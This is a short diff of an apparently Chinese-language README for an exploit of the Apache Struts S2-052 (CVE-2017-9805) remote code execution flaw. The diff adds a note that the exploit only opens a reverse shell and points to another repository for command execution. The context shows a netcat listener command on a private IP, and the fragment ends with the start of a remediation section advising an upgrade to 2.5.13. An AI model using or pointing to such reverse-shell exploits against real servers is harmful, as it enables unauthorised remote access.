@@ -49,6 +49,8 @@ nc 192.168.199.246 6666
 
 ![exploit](https://github.com/iBearcat/S2-052/blob/master/exploit.jpg?raw=true)
 
+本Exploit只做Shell反弹，如执行命令回显请https://github.com/luc10/struts-rce-cve-2017-9805
+
 ## 修复方案
 
 1.建议尽快升级到 2.5.13版本。
